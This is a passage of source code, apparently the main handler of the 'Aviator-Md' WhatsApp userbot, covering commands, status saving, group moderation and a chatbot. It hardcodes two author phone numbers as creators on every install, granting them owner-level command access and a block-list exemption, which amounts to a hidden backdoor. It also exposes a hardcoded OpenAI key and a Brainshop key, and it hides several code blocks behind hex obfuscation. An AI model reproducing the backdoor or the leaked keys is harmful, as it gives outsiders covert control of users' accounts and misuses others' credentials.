/**
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////                       
//                                                                                                                                     // 
//                                                                                                                                     // 
//                                                        Ｖ：１．０．１                                                                // 
//                                                                                                                                     // 
//                         █████╗ ██╗   ██╗██╗ █████╗ ████████╗ ██████╗ ██████╗     ███╗   ███╗██████╗                                 // 
//                        ██╔══██╗██║   ██║██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗    ████╗ ████║██╔══██╗                                //
//                        ███████║██║   ██║██║███████║   ██║   ██║   ██║██████╔╝    ██╔████╔██║██║  ██║                                //
//                        ██╔══██║╚██╗ ██╔╝██║██╔══██║   ██║   ██║   ██║██╔══██╗    ██║╚██╔╝██║██║  ██║                                //
//                        ██║  ██║ ╚████╔╝ ██║██║  ██║   ██║   ╚██████╔╝██║  ██║    ██║ ╚═╝ ██║██████╔╝                                //
//                        ╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝                                 //
//                                                                                                                                     // 
//                                                                                                                                     // 
//                                                                                                                                     // 
//                                                                                                                                     // 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


*
   * @project_name : Aviator-Md
   * @author : Suhail Tech Info
   * @youtube : https://www.youtube.com/SuhailTechInfo
   * @description : Aviator-Md ,A Multi-functional whatsapp user bot.
   * @version 0.0.1
*
   * Licensed under the  GPL-3.0 License;
* 
   * Started on 5-aug-23.
   * © 2023 Aviator-Md.
* 
   * Introducing Aviator-Md, It is designed to bring a whole new level of excitement to your boring WhatsApp use.
*

**/



const express = require("express");
const app= express();
const fs = require('fs-extra');
const DB = require('../lib/scraper')


var suhails= false;
const pino = require('pino')
const path = require('path');
const util = require("util");
const chalk= require("chalk");
const axios= require("axios");
const fetch= require("node-fetch");
global.db  = JSON.parse(fs.readFileSync(__dirname + "/database.json"));

const events = require('./commands');
const Levels = require("discord-xp") ;
const Config = require('../config.js');
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const prefix = Config.HANDLERS.includes("null") ? '' : Config.HANDLERS[0];
//const Sesion = Config.sessionId.replace(/Secktor;;;/g, "").replace(/Aviator;;;/g, "") ;

var last_status= [];
const mongoose = require('mongoose');
const CryptoJS = require("crypto-js");
const FileType = require('file-type');
const { Boom } = require("@hapi/boom");
const { smsg } = require('../lib/myfuncn')

global.setCmdAlias= {}
const {writeFile} = require("fs/promises");
const speedofbot  = require("performance-now");
const PhoneNumber = require('awesome-phonenumber')

const { exec, spawn, execSync } = require("child_process");
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./exif')

var prefixRegex = Config.prefix === "false" || Config.prefix === "null" ? new RegExp('^[]') : new RegExp('^[' + Config.HANDLERS + ']');
let { isUrl, sleep, getBuffer, format, parseMention,parsedJid, getRandom, fancy, randomfancy,tiny ,  botpic, tlang } = require("../lib");
const { sck1, RandomXP, sck, plugindb, card ,formatp, formatDate, getTime, clockString, runtime, fetchJson, jsonformat, GIFBufferToVideoBuffer, getSizeMedia, generateMessageTag, fancytext } = require('../lib')
const { default: VoidConnect, BufferJSON,generateLinkPreviewIfRequired, WA_DEFAULT_EPHEMERAL, proto, generateWAMessageContent, generateWAMessage, AnyMessageContent, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage, DisconnectReason, useMultiFileAuthState, fetchLatestBaileysVersion, MessageRetryMap, generateForwardMessageContent, generateWAMessageFromContent, generateMessageID, makeInMemoryStore, jidDecode } = require("@sampandey001/baileys")


try { Levels.setURL(mongodb); console.log("🌍 Connected to Taira Tech DB");} 
catch(e){ console.log("Could not connect with Mongodb please provide accurate url."); process.exit(0); }

/*async function MakeSession(){
    if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
        if(Sesion.length<30){
            let { data } = await axios.get('https://paste.c-net.org/'+Sesion);
            await fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', atob(data), "utf8");    
        }else{ await fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', atob(Sesion), "utf8"); }
    }
}
MakeSession()*/
/*let cc = Config.sessionId.replace(/Secktor;;;/g, "");
async function MakeSession(){
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if(cc.length<30){
    const axios = require('axios');
    let { data } = await axios.get('https://paste.c-net.org/'+cc)
    await fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', atob(data), "utf8")    
    } else {
	 var c = atob(cc)
         await fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', c, "utf8")    
    }
}
}
MakeSession()*/

setTimeout(() => {
    const moment = require('moment-timezone')
    async function main() {
	//if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {  }
	try{await mongoose.connect(mongodb);}catch {console.log('Could not connect with Mongodb.\nPlease visit https://secktorbot.tech/wiki'); }
    }
    main()
    //========================================================================================================================================
    const store = makeInMemoryStore({
        logger: pino().child({ level: "silent", stream: "store" }),
    });
    require("events").EventEmitter.defaultMaxListeners = 600;
    const getVersionWaweb = () => {
        let version
        try {
            let a = fetchJson('https://web.whatsapp.com/check-update?version=1&platform=web')
            version = [a.currentVersion.replace(/[.]/g, ', ')]
        } catch(e) { version = [2, 2204, 13] }
        return version
    }
    let Aviator = {client : {} };
    let QR_GENERATE = "invalid";
    const msgRetryCounterMap = MessageRetryMap || {}
    async function syncdb() {
        let thumbbuffer = await getBuffer(THUMB_IMAGE)
        const ChangePic = __dirname + "/assets/SocialLogo.png"
        await writeFile(ChangePic, thumbbuffer);
        global.log0 = fs.readFileSync(__dirname + "/assets/SocialLogo.png"); //ur logo pic
        //const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
	const { state, saveCreds } = await useMultiFileAuthState("./sessionDir");
        Aviator.client = VoidConnect({
            logger: pino({ level: 'fatal' }),
            printQRInTerminal: true,
            browser: ['Taira-Session', 'safari', '1.0.0'],
            fireInitQueries: false,
            shouldSyncHistoryMessage: false,
            downloadHistory: false,
            syncFullHistory: false,
            generateHighQualityLinkPreview: true,
            auth: state,
            version: await getVersionWaweb() || [2, 2242, 6],
            getMessage: async key => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
                    return msg.message || undefined
                }
                return { conversation: 'An Error Occurred, Repeat Command!'}
            }
        })
        store.bind(Aviator.client.ev)
        setInterval(() => { store.writeToFile(__dirname+"/store.json"); }, 30 * 1000);
        Aviator.client.ev.on('messages.upsert', async chatUpdate => {
	        const botNumber = await Aviator.client.decodeJid(Aviator.client.user.id)
            const hgg = botNumber.split('@')[0]
            const mek = chatUpdate.messages[0]
            if (!mek.message) return
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
            if(mek.key && mek.key.remoteJid === 'status@broadcast'){
               last_status = mek;
               if( Config.read_status === 'true'){ await Aviator.client.readMessages([mek.key]);}
               if( Config.save_status === 'true'){
                  if(mek.message.extendedTextMessage){ 
                     let cap = mek.message.extendedTextMessage.text;
                     await Aviator.client.sendMessage(botNumber,{text :cap },{quoted : mek});
                  }else if(mek.message.imageMessage){
                     let cap = mek.message.imageMessage.caption;
                     let anu = await Aviator.client.downloadAndSaveMediaMessage(mek.message.imageMessage)
                     await Aviator.client.sendMessage(botNumber,{image:{url : anu} , caption : cap  },{quoted : mek});
                  }else if(mek.message.videoMessage){
                     let cap = mek.message.videoMessage.caption;
                     let anu = await Aviator.client.downloadAndSaveMediaMessage(mek.message.videoMessage)
                     await Aviator.client.sendMessage(botNumber,{video:{url : anu} , caption : cap },{quoted : mek});
                  }
               }
               return;
            }
            //if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            try {
		         //if(mek.message.viewOnceMessageV2) return 
               let msg = await smsg(Aviator.client, JSON.parse(JSON.stringify(mek)), store)
               if (!msg.message) return
               //if (msg.chat.endsWith("broadcast")) return;
               if (Config.alwaysonline == "true") {   Aviator.client.sendPresenceUpdate('available', msg.chat)   }
		         else  { Aviator.client.sendPresenceUpdate('unavailable', msg.chat)  } 
               var { body } = msg
		         const suhail = ['923184474176','923004591719'] ;
               let isCreator = [ hgg,...suhail,...global.sudo.split(','),...global.devs, ...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(msg.sender);
               var suhails = [...suhail].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(msg.sender)
               let icmd = false;
               let cmdName = false;    
               var budy = typeof msg.text == "string" ? msg.text.trim() : false;
               if (budy && body[1] && body[1] == " ") body = body[0] + body.slice(2);          
               if (budy && Config.HANDLERS.includes('null')){  icmd = true; cmdName =  body.split(" ")[0].toLowerCase() || false; 
               }else if (budy && !Config.HANDLERS.includes('null')){icmd = body ? prefixRegex.test(body[0]) : false; cmdName = icmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false; 
               }else { icmd = false; }
               let aliasCmd = cmdName ? cmdName.trim()  :  '';
               if(aliasCmd && global.setCmdAlias[aliasCmd] !== undefined ){ cmdName = global.setCmdAlias[aliasCmd]; icmd = true;  
               }else if (msg.mtype == 'stickerMessage'){
                  aliasCmd = `sticker-${msg.msg.fileSha256}`;
                  if(global.setCmdAlias[aliasCmd]) { cmdName = global.setCmdAlias[aliasCmd]; icmd = true;  }                            
               }


               const blockJid = ['120363025246125888@g.us' ,...global.blockJids.split(',')]
               const allowJid = ['120363025246125888@g.us' ,...global.allowJids.split(',')]
               if (blockJid.includes(msg.chat) && !suhails ) return
	            if (!isCreator && Config.WORKTYPE === 'private' && icmd && !allowJid.includes(msg.chat)   ){ icmd = false;	}


	            if (Config.readmessage==="true" && icmd) { await Aviator.client.readMessages([mek.key]) }
               const args = msg.body ? body.trim().split(/ +/).slice(1) : null;
               const quoted = msg.quoted ? msg.quoted : msg;
               const mime = (quoted.msg || quoted).mimetype || "";

               if (!isCreator && Config.disablepm === 'true' && icmd && !msg.isGroup) { icmd = false }
		         if(!isCreator){
                  let checkban = await sck1.findOne({ id: msg.sender }) || await new sck1({ id: msg.sender, name: msg.pushName }).save();
		            let checkg = await sck.findOne({ id: msg.chat }) || await new sck({ id: msg.chat }).save();
		            if(checkg.botenable==='false') return
                  if (icmd && checkban.ban !== 'false') return msg.reply(`*Hii ${msg.pushName},*\n_You are banned ❌ from using commands._\n_Please contact owner for further information._`)
		         }
		         //const cmdName = icmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
               if (icmd){
                  let cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                  if (msg.isGroup && cmd ) {
                     const _0x165748=_0x5c94;(function(_0x501967,_0x5e2622){const _0x1fe502=_0x5c94,_0x211b2a=_0x501967();while(!![]){try{const _0x3e2e4f=-parseInt(_0x1fe502(0xe9))/0x1*(-parseInt(_0x1fe502(0xe3))/0x2)+-parseInt(_0x1fe502(0xf1))/0x3*(parseInt(_0x1fe502(0xee))/0x4)+parseInt(_0x1fe502(0xe0))/0x5*(parseInt(_0x1fe502(0xe6))/0x6)+parseInt(_0x1fe502(0xef))/0x7*(-parseInt(_0x1fe502(0xed))/0x8)+-parseInt(_0x1fe502(0xe5))/0x9+-parseInt(_0x1fe502(0xe8))/0xa*(-parseInt(_0x1fe502(0xde))/0xb)+parseInt(_0x1fe502(0xec))/0xc*(parseInt(_0x1fe502(0xf0))/0xd);if(_0x3e2e4f===_0x5e2622)break;else _0x211b2a['push'](_0x211b2a['shift']());}catch(_0x365754){_0x211b2a['push'](_0x211b2a['shift']());}}}(_0x2704,0x7a07c));function _0x5c94(_0x2a1ce1,_0x4767e0){const _0x270415=_0x2704();return _0x5c94=function(_0x5c94bc,_0x53ebb3){_0x5c94bc=_0x5c94bc-0xde;let _0x3e438c=_0x270415[_0x5c94bc];return _0x3e438c;},_0x5c94(_0x2a1ce1,_0x4767e0);}function _0x2704(){const _0x5ee069=['disablecmds','false','17916skguiQ','2114664fcfwEo','8QcYjht','7kZOayQ','8879Nlhecq','503643ajcLdb','202620gQJDnE','test','203855PiXgpI','chat','pattern','197732gluUkp','replace','3589623rKOuko','18MpMZTW','findOne','140bXqCxJ','1fKVtRB'];_0x2704=function(){return _0x5ee069;};return _0x2704();}let checkg=await sck[_0x165748(0xe7)]({'id':msg[_0x165748(0xe1)]})||![];if(checkg){let Suhail_Md_CheckCmd=cmd[_0x165748(0xe2)][_0x165748(0xe4)](/[.*+?^${}()|[\]\\]/g,'\x5c$&'),disableCmdRegex=new RegExp('\x5cb'+Suhail_Md_CheckCmd+'\x5cb');checkg[_0x165748(0xea)]!==_0x165748(0xeb)&&disableCmdRegex[_0x165748(0xdf)](checkg['disablecmds'])&&(cmd=![]);}
                  }
                  if (cmd) {
                     isCreator = [hgg,...suhail,...global.sudo.split(','),...global.devs,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(msg.sender);
                     if (cmd.react) msg.react(cmd.react)
                     let text;
                     cmdName = cmd.pattern
                     try { text = msg.body ? body.trim().split(/ +/).slice(1).join(" ") : '';}
			        catch { text = ''; }
                     try {  cmd.function(Aviator, msg, text,{ cmdName , args, isCreator, body, budy });}
		            catch (e) { console.error("[ERROR] ", e); }
                  }else{
                     const _0x377b3b=_0x58e6;function _0x58e6(_0x573fb0,_0x674130){const _0x497f12=_0x497f();return _0x58e6=function(_0x58e6e7,_0x2d6c4c){_0x58e6e7=_0x58e6e7-0xe5;let _0x5bd3c7=_0x497f12[_0x58e6e7];return _0x5bd3c7;},_0x58e6(_0x573fb0,_0x674130);}(function(_0x41bbec,_0x364bdb){const _0x32a33f=_0x58e6,_0x3563ff=_0x41bbec();while(!![]){try{const _0xa449a1=parseInt(_0x32a33f(0xee))/0x1*(parseInt(_0x32a33f(0xe6))/0x2)+parseInt(_0x32a33f(0xec))/0x3+-parseInt(_0x32a33f(0xe5))/0x4*(-parseInt(_0x32a33f(0xf1))/0x5)+-parseInt(_0x32a33f(0xe9))/0x6+parseInt(_0x32a33f(0xf3))/0x7*(parseInt(_0x32a33f(0xf7))/0x8)+parseInt(_0x32a33f(0xf4))/0x9*(-parseInt(_0x32a33f(0xea))/0xa)+-parseInt(_0x32a33f(0xf0))/0xb;if(_0xa449a1===_0x364bdb)break;else _0x3563ff['push'](_0x3563ff['shift']());}catch(_0x343ab4){_0x3563ff['push'](_0x3563ff['shift']());}}}(_0x497f,0xe2319));const categry=events[_0x377b3b(0xeb)]['find'](_0x12a40d=>_0x12a40d['category']===cmdName)||![];if(categry){const cmds={};let lists='';events[_0x377b3b(0xeb)][_0x377b3b(0xf5)](async(_0xdc85d9,_0x1049b2)=>{const _0x9f8990=_0x377b3b;if(_0xdc85d9['dontAddCommandList']===![]&&_0xdc85d9['pattern']!==undefined){if(!cmds[_0xdc85d9['category']])cmds[_0xdc85d9[_0x9f8990(0xf9)]]=[];cmds[_0xdc85d9[_0x9f8990(0xf9)]][_0x9f8990(0xf2)](_0xdc85d9[_0x9f8990(0xf8)]);}});for(const category in cmds){if(cmdName==category[_0x377b3b(0xef)]()){lists='┌───〈\x20'+category+_0x377b3b(0xe7);for(const plugins of cmds[category]){lists+=_0x377b3b(0xe8)+plugins+'\x0a';}lists+=_0x377b3b(0xed);break;}}let pic=await getBuffer(await botpic());await msg[_0x377b3b(0xf6)](pic,{'caption':tiny(lists)},_0x377b3b(0xfa));}function _0x497f(){const _0x446051=['send','8KlmWiE','pattern','category','image','804ocHpJA','144CKKwzC','\x20Menu\x20\x20〉───◆\x0a│╭─────────────···▸\x0a┴│▸\x0a','⬡│▸\x20','6516828QWUyXI','10gALjJe','commands','3508419vcQtsA','┬│▸\x0a│╰────────────···▸▸\x0a└───────────────···▸','20891CFmmht','toLowerCase','25871384DMxHHe','19490uAYMlN','push','11060133GGyMVF','6053139LFlHEq','map'];_0x497f=function(){return _0x446051;};return _0x497f();}
                  }
               }
               events.commands.map(async(command) => {
                  if (body && command.on === "body") { command.function(Aviator.client, msg,{args, isCreator, icmd, body, budy}); }
		            else if (msg.text && command.on === "text") { command.function(Aviator.client, msg, args,{isCreator, icmd, body, budy}); }
		            else if ( (command.on === "image" || command.on === "photo") && msg.mtype === "imageMessage" ) { command.function(Aviator.client, msg, args,{isCreator, body, budy}); }
		            else if ( command.on === "sticker" && msg.mtype === "stickerMessage" ) {  command.function(Aviator.client, msg, args,{isCreator, body, budy}); }
               });
               const groupMetadata = msg.isGroup ? await Aviator.client.groupMetadata(msg.chat).catch((e) => {}) : "";
		         let participants = '';
		         try { participants = msg.isGroup ? (groupMetadata ? await groupMetadata.participants : "") : "";
		         } catch (error) { return console.log("Group Jid : ",msg.chat,"\n Is Group Info",msg.isGroup," \n GroupData : ", groupMetadata ,"\n Group Legnth : " ,groupMetadata.length , "\n& Error Is :  ",error,"\n========================================") }
		    
               const groupAdminss = (participants) => {
                  let a = [];
                  for (let i of participants) {
                     if (i.admin == null) continue;
                     a.push(i.id);
                  }
                  return a;
               }
               const groupAdmins = msg.isGroup ? await groupAdminss(participants) : ''
               const isBotAdmins = msg.isGroup ? groupAdmins.includes(botNumber) : false;
               const isAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false;
               if(msg.isGroup && Config.MsgsInLog=="true"){ onsole.log('Message in Group\nIn=> '+groupMetadata.subject+' '+msg.sender+'\nMessage:'+msg.body+'\n==============================='); }
               if(!msg.isGroup && Config.MsgsInLog== "true"){ console.log('Message in Personal\nFrom=> '+msg.pushName+' '+msg.sender+'\nMessage:'+msg.body+'\n==============================='); }
                
		         setInterval(() => { fs.writeFileSync(__dirname + "/database.json", JSON.stringify(global.db, null, 2)); }, 10000);
  
               try{
                  let GroupS = await sck.findOne({ id: msg.chat })
                  if (GroupS && msg.isGroup && !isCreator && !isAdmins && msg.mtype !== 'reactionMessage') {  
                     if(GroupS.antibot === 'true'){
                        const _0x134b47=_0x3fc0;function _0x3fc0(_0x168655,_0x4c1704){const _0x1aee56=_0x1aee();return _0x3fc0=function(_0x3fc016,_0x265446){_0x3fc016=_0x3fc016-0x1f4;let _0x377699=_0x1aee56[_0x3fc016];return _0x377699;},_0x3fc0(_0x168655,_0x4c1704);}function _0x1aee(){const _0x8a266c=['1204078iJytAx','key','580xpfWRJ','8NCnkWp','2676AnWCSR','56169ogNFuj','reply','1DSTqud','startsWith','165402euiBAU','566778eGTDMx','1519110WWJYPs','sendMessage','chat','3286048GcgRSn','remove','groupParticipantsUpdate','BAE','28ohcSlG','sender','*_Uhh\x20Please,\x20Provide\x20Admin\x20Role\x20To\x20Kick\x20Other\x20Bot_*\x0a*_Or\x20Disable\x20Antibot\x20(On/Off)\x20In\x20Current\x20Group_*','51997YmCBeV'];_0x1aee=function(){return _0x8a266c;};return _0x1aee();}(function(_0x2e1c29,_0x30e363){const _0x351c87=_0x3fc0,_0x1a1ffb=_0x2e1c29();while(!![]){try{const _0x439157=parseInt(_0x351c87(0x1fa))/0x1*(parseInt(_0x351c87(0x209))/0x2)+-parseInt(_0x351c87(0x1fc))/0x3*(-parseInt(_0x351c87(0x1f6))/0x4)+-parseInt(_0x351c87(0x1fe))/0x5+-parseInt(_0x351c87(0x1fd))/0x6*(parseInt(_0x351c87(0x205))/0x7)+-parseInt(_0x351c87(0x201))/0x8+parseInt(_0x351c87(0x1f8))/0x9*(-parseInt(_0x351c87(0x1f5))/0xa)+-parseInt(_0x351c87(0x208))/0xb*(-parseInt(_0x351c87(0x1f7))/0xc);if(_0x439157===_0x30e363)break;else _0x1a1ffb['push'](_0x1a1ffb['shift']());}catch(_0x23a14f){_0x1a1ffb['push'](_0x1a1ffb['shift']());}}}(_0x1aee,0x4c2d4));if(isBotAdmins&&msg[_0x134b47(0x1f4)]['id'][_0x134b47(0x1fb)]('BAE')){const key={'remoteJid':msg[_0x134b47(0x200)],'fromMe':![],'id':msg['id'],'participant':msg[_0x134b47(0x206)]};await Aviator.client[_0x134b47(0x1ff)](msg['chat'],{'delete':key}),await Aviator.client[_0x134b47(0x203)](msg[_0x134b47(0x200)],[msg['sender']],_0x134b47(0x202)),await msg['send']('*_User\x20@'+msg[_0x134b47(0x206)]['split']('@')[0x0]+'\x20kick\x20Due\x20To\x20Antibot!_*\x0a*_Bot\x20User\x20Not\x20Allowed\x20In\x20Current\x20Group_*',{'mentions':[msg[_0x134b47(0x206)]]});}else!isBotAdmins&&msg[_0x134b47(0x1f4)]['id'][_0x134b47(0x1fb)](_0x134b47(0x204))&&await msg[_0x134b47(0x1f9)](_0x134b47(0x207));
                     }
                     if (GroupS.onlyadmin === 'true') {
                        const _0x3e43bf=_0x46e4;(function(_0xab1ee1,_0x13104a){const _0x2af7df=_0x46e4,_0xe46326=_0xab1ee1();while(!![]){try{const _0x283b79=-parseInt(_0x2af7df(0x91))/0x1+-parseInt(_0x2af7df(0x86))/0x2+parseInt(_0x2af7df(0x93))/0x3*(parseInt(_0x2af7df(0x8c))/0x4)+-parseInt(_0x2af7df(0x97))/0x5+-parseInt(_0x2af7df(0x8f))/0x6*(parseInt(_0x2af7df(0x8b))/0x7)+parseInt(_0x2af7df(0x88))/0x8+-parseInt(_0x2af7df(0x87))/0x9*(-parseInt(_0x2af7df(0x8d))/0xa);if(_0x283b79===_0x13104a)break;else _0xe46326['push'](_0xe46326['shift']());}catch(_0xedf048){_0xe46326['push'](_0xe46326['shift']());}}}(_0x3d2b,0xed08a));if(isBotAdmins){const key={'remoteJid':msg[_0x3e43bf(0x92)],'fromMe':![],'id':msg['id'],'participant':msg[_0x3e43bf(0x85)]};await Aviator.client['sendMessage'](msg[_0x3e43bf(0x92)],{'delete':key}),await Aviator.client[_0x3e43bf(0x94)](msg[_0x3e43bf(0x92)],[msg['sender']],_0x3e43bf(0x95)),await msg['send'](_0x3e43bf(0x8e)+msg['sender'][_0x3e43bf(0x96)]('@')[0x0]+_0x3e43bf(0x89),{'mentions':[msg[_0x3e43bf(0x85)]]});}else await msg[_0x3e43bf(0x90)](_0x3e43bf(0x8a));function _0x46e4(_0x1349d4,_0x1313c7){const _0x3d2b6f=_0x3d2b();return _0x46e4=function(_0x46e490,_0x16f76a){_0x46e490=_0x46e490-0x85;let _0x2060ff=_0x3d2b6f[_0x46e490];return _0x2060ff;},_0x46e4(_0x1349d4,_0x1313c7);}function _0x3d2b(){const _0x15ae46=['remove','split','3849115NwSdfa','sender','1585964aPxpjI','189ezscyf','9093216NrqInd','\x20Kick\x20For\x20Sending,\x20Message\x20in\x20Group*','*_Provide\x20admin\x20role\x20to\x20kick\x20Message\x20Senders_*\x0a*Or\x20_Disable\x20onlyadmin(on/off)\x20in\x20currentchat_*','196wAClxf','28BSBqFd','1301340oAAqea','*User\x20@','300738BbkHQe','send','903297UcflOD','chat','416130XpFFpZ','groupParticipantsUpdate'];_0x3d2b=function(){return _0x15ae46;};return _0x3d2b();}
                     }
                     if (GroupS.antilink !== "false") {
                        const _0xfa249c=_0x26c3;(function(_0xff21cf,_0x5b5518){const _0x645278=_0x26c3,_0x40230f=_0xff21cf();while(!![]){try{const _0xd69d37=parseInt(_0x645278(0x202))/0x1*(-parseInt(_0x645278(0x20a))/0x2)+-parseInt(_0x645278(0x1f9))/0x3*(parseInt(_0x645278(0x20f))/0x4)+-parseInt(_0x645278(0x1fe))/0x5+-parseInt(_0x645278(0x214))/0x6*(parseInt(_0x645278(0x20e))/0x7)+parseInt(_0x645278(0x209))/0x8+-parseInt(_0x645278(0x20b))/0x9*(-parseInt(_0x645278(0x212))/0xa)+parseInt(_0x645278(0x208))/0xb;if(_0xd69d37===_0x5b5518)break;else _0x40230f['push'](_0x40230f['shift']());}catch(_0x46c004){_0x40230f['push'](_0x40230f['shift']());}}}(_0x2e54,0x2a32c));var array=Config['antilink_values']['split'](',')||['https;//'];if(array['some'](_0x3b9e26=>body[_0xfa249c(0x211)]()[_0xfa249c(0x216)](_0x3b9e26))){if(!isBotAdmins){let Suhail_Md=_0xfa249c(0x215)+msg[_0xfa249c(0x201)]['split']('@')[0x0]+_0xfa249c(0x200)+tlang()[_0xfa249c(0x204)]+_0xfa249c(0x20c)+(GroupS[_0xfa249c(0x213)]===_0xfa249c(0x206)?_0xfa249c(0x1f6):'delete\x20\x0alinks\x20from\x20this\x20Chat')+_0xfa249c(0x1fa);await msg[_0xfa249c(0x1f8)](Suhail_Md,{'mentions':[msg[_0xfa249c(0x201)]]});}else{if(GroupS[_0xfa249c(0x213)]===_0xfa249c(0x210)||GroupS[_0xfa249c(0x213)]===_0xfa249c(0x1f7)){await msg['send']('*_Link\x20Detected!!_*');const key={'remoteJid':msg['chat'],'fromMe':![],'id':msg['id'],'participant':msg[_0xfa249c(0x201)]};await Aviator.client[_0xfa249c(0x20d)](msg[_0xfa249c(0x203)],{'delete':key});}else{if(GroupS[_0xfa249c(0x213)]===_0xfa249c(0x206)){await msg['send'](_0xfa249c(0x1f5));try{const key={'remoteJid':msg[_0xfa249c(0x203)],'fromMe':![],'id':msg['id'],'participant':msg[_0xfa249c(0x201)]};await Aviator.client['sendMessage'](msg[_0xfa249c(0x203)],{'delete':key}),await Aviator.client['groupParticipantsUpdate'](msg[_0xfa249c(0x203)],[msg[_0xfa249c(0x201)]],_0xfa249c(0x207));}catch{await msg[_0xfa249c(0x1f8)]('*Link\x20Detected*\x0a'+tlang()[_0xfa249c(0x1fd)]);}}else{console[_0xfa249c(0x1fb)]('this\x20group\x20Whatsapp\x20link');let response=await Aviator.client[_0xfa249c(0x1f4)](msg[_0xfa249c(0x203)]);h=_0xfa249c(0x1ff)+response;let patternn=new RegExp('\x5cb'+[h]+'\x5cb','ig');patternn[_0xfa249c(0x1fc)](body)&&await msg[_0xfa249c(0x205)]('I\x20won\x27t\x20remove\x20you\x20for\x20sending\x20this\x20group\x20link.');}}}}function _0x26c3(_0x5952ed,_0x30700e){const _0x2e5451=_0x2e54();return _0x26c3=function(_0x26c376,_0xc720a9){_0x26c376=_0x26c376-0x1f4;let _0x3c5665=_0x2e5451[_0x26c376];return _0x3c5665;},_0x26c3(_0x5952ed,_0x30700e);}function _0x2e54(){const _0x35255e=['delete','toLowerCase','625610DDSUrw','antilink','570OcrxkT','\x20\x20\x20\x20*[\x20Link\x20detected\x20]*\x0a\x20\x20\x20\x20\x20\x20\x20\x20User\x20@','includes','groupInviteCode','*_Link\x20Detected!!_*','kick\x20\x0alink\x20senders.','true','send','233397LkmWLp','\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20','log','test','botAdmin','1123100vEsgnn','chat.whatsapp.com/','\x20detected\x20sending\x20a\x20link.\x0a\x20\x20\x20\x20\x20\x20\x20\x20Promote\x20','sender','46nCbagh','chat','title','reply','kick','remove','7213932aEJdZU','2421712cAdSOc','11588AolyUY','9HRREKL','\x20as\x20admin\x20to\x20','sendMessage','20580ooVvmP','4bNQNNP'];_0x2e54=function(){return _0x35255e;};return _0x2e54();}
                     }
                  }
               } catch (err) {console.log("Error at Onlyadmin || Antilinks || Antibot\n",err)}



               const { chatbot } = require('../lib/')
               let checkbot = await chatbot.findOne({ id: 'chatbot' }) || await new chatbot({ id: 'chatbot'}).save();
               let checkon = checkbot.worktype
               if (checkon === 'true' && !icmd) {
                  console.log('chatbot is on')
                  if (msg.key.fromMe) return
                  let zx = msg.text.length
                  try {
                     if (msg.isGroup && !msg.quoted && !icmd) return
                     if (msg.text && !msg.isGroup) {
                        if (zx < 100) {
                           var diffuser = msg.sender.split("@")[0];
                           let fetchk = require("node-fetch");
                           var textuser = budy
                           let fetchtext = await fetchk(`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${textuser}]`);
                           let json = await fetchtext.json();
                           let { cnt } = json;
                           msg.reply(cnt);
                           //console.log('CHATBOT RESPONSE\n' + 'text=>' + textuser + '\n\nResponse=>' + cnt)
                        }
                        const { Configuration, OpenAIApi } = require("openai");
                        const configuration = new Configuration({  apiKey: Config.OPENAI_API_KEY || "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", });
                        const openai = new OpenAIApi(configuration);
                        const completion = await openai.createCompletion({
                           model: "text-davinci-002",
                           prompt: budy,
                           temperature: 0.5,
                           max_tokens: 80,
                           top_p: 1.0,
                           frequency_penalty: 0.5,
                           presence_penalty: 0.0,
                           stop: ['"""'],
                        });
                        msg.reply(completion.data.choices[0].text);
                     }else if (msg.text && !icmd && msg.isGroup && msg.quoted) {
                        let mention = msg.mentionedJid ? msg.mentionedJid[0] : msg.msg.contextInfo.participant || false;
                        if (mention && !mention.includes(botNumber)) return
                        if (zx < 100) {
                           var diffuser = msg.sender.split("@")[0];
                           let fetchk = require("node-fetch");
                           let fetchtext = await fetchk(`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${msg.text}]`);
                           let json = await fetchtext.json();
                           let { cnt } = json;  console.log(cnt);
                           msg.reply(cnt);                                
                        }
                        //	if (!querie && !quoted) return msg.reply(`Hey there! ${pushname}. How are you doing these days?`);
                        const { Configuration, OpenAIApi } = require("openai");
                        const configuration = new Configuration({  apiKey: Config.OPENAI_API_KEY || "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", });                           const openai = new OpenAIApi(configuration);
                        const completion = await openai.createCompletion({
                           model: "text-davinci-002",
                           prompt: budy,
                           temperature: 0.5,
                           max_tokens: 80,
                           top_p: 1.0,
                           frequency_penalty: 0.5,
                           presence_penalty: 0.0,
                           stop: ['"""'],
                        });
                        msg.reply(completion.data.choices[0].text);
                     }
                  } catch (err) {  console.log("Error From ChatBot : " ,err);   /* msg.reply(err);*/ }
               }
               var bad_Words = Config.antibadword.split(",")
               bad_Words.map(async(reg) => {
			         if(isAdmins) return 
                     let pattern = new RegExp(`\\b${reg}\\b`, 'ig');
                     let chab = budy.toLowerCase()
